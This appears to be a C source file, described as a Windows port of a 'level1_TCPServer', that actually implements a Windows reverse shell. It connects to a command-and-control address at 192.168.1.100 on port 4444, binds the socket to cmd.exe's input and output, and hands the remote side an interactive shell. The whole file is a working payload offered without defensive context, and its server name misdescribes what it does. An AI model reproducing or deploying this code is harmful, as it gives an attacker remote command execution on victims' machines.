// Windows port of level1_TCPServer
// Replaces POSIX sockets with WinSock2 API

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // Initialize WinSock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Configure server address
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);

    // Connect to C2 server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Setup process startup info to redirect I/O
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    // Spawn cmd.exe shell with I/O redirected to socket
    if (!CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        TRUE,  // Inherit handles
        0,
        NULL,
        NULL,
        &si,
        &pi)) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Wait for shell to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
